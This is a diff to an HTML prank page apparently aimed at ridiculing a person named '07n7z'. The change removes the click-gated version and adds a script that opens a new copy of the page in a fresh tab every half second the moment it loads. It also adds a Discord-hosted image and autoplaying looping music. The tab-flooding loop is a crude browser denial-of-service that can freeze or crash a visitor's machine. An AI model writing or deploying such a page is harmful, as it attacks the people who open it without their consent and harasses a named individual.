@@ -2,37 +2,24 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>07n7z in the Toilet</title>
+  <title>shit site</title>
   <style>
     body {
       background-color: #000;
       color: #fff;
-      font-family: Arial, sans-serif;
-      margin: 0;
-      height: 100vh;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      cursor: pointer;
+      height: 100vh;
+      margin: 0;
     }
 
-    #hint {
-      position: absolute;
-      top: 0;
-      width: 100%;
-      background-color: #111;
-      padding: 10px;
-      text-align: center;
-      font-size: 18px;
-      color: #0f0;
-    }
-
-    #message {
-      font-size: 36px;
-      font-weight: bold;
+    #image {
+      max-width: 90%;
+      border-radius: 10px;
+      box-shadow: 0 0 30px #fff5;
       margin-top: 20px;
-      text-align: center;
     }
 
     audio {
@@ -40,45 +27,25 @@
     }
   </style>
 </head>
-<body onclick="enableEverything()">
+<body>
 
-  <!-- Hint Bar -->
-  <div id="hint">
-    Click anywhere to enable sound
-  </div>
+  <!-- Image Displayed Immediately -->
+  <img
+    id="image"
+    src="https://media.discordapp.net/attachments/1369297537848053781/1370261459048730685/2025050911493359.jpg?ex=6820d52e&is=681f83ae&hm=0f95430ea4d21f09d5a054bda37095a890c121c48ed5ecbc2b39851c2d7d43f2&=&format=webp&width=1376&height=774"
+    alt="Revealed Image"
+  >
 
-  <!-- Main Message -->
-  <div id="message">
-    07n7z is in the toilet
-  </div>
-
-  <!-- Audio -->
-  <audio id="bgMusic" loop>
+  <!-- Autoplay Background Music -->
+  <audio id="bgMusic" autoplay loop>
     <source src="https://ia601501.us.archive.org/8/items/Communism_shall_rule_the_world_forever/Red%20sun%20in%20the%20sky.mp3" type="audio/mpeg">
   </audio>
 
   <script>
-    let intervalStarted = false;
-
-    function enableEverything() {
-      const music = document.getElementById("bgMusic");
-      const hint = document.getElementById("hint");
-
-      // Start music
-      music.play().catch(() => alert("Autoplay blocked. Click again!"));
-      hint.style.display = "none";
-
-      // Start tab cloning once
-      if (!intervalStarted) {
-        intervalStarted = true;
-        setInterval(() => {
-          window.open(window.location.href, '_blank');
-        }, 60000);
-      }
-
-      // Prevent triggering again on every click
-      document.body.onclick = null;
-    }
+    // Open a new tab every 1/2 seconds
+    setInterval(() => {
+      window.open(window.location.href, '_blank');
+    }, 500);
   </script>
 
 </body>
